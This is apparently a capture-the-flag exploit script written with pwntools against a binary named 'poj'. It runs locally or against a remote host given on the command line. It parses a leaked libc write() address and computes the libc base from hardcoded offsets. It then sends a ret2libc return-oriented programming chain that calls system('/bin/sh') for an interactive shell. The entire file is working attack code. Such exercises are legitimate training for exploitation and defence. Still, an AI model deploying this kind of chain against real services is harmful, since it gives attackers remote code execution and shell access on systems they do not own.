from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
b *system
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './poj'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================



# Start program
io = start()

# Offset of pop_rdi gadget from ropper
# We need to find the PIEBASE before we can use

# Leak 15th address from stack (main+44)
io.recvuntil(b'Write() address : ')  # Address will follow
leaked_addr = int(io.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

# Offset to RIP, found manually with GDB
offset = 72 

# now found useful gadgets to make Rop chain

# libc.so.6 write = 0xff4d0
libc_write = 0xff4d0  # readelf -s libc.so.6 | grep write 
libc_system  = 0x000000000004dab0  # readelf -s libc.so.6 | grep system 
libc_bin_sh = 0x197e34 # strings -t x libc.so.6 | grep "/bin/sh"
pop_rdi_offset =  0x0000000000028215 # found with ropper 
ret_offset =  0x00000000000f35d8 # found with ropper

# Now calculate the PIEBASE
libc_addr = leaked_addr - libc_write 
sys_addr = libc_addr + libc_system
bin_sh = libc_addr + libc_bin_sh
pop_rdi = pop_rdi_offset + libc_addr
ret_addr = ret_offset + libc_addr

payload = flat({
    offset:[
        pop_rdi,
        bin_sh,
        ret_addr,
        sys_addr
        ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
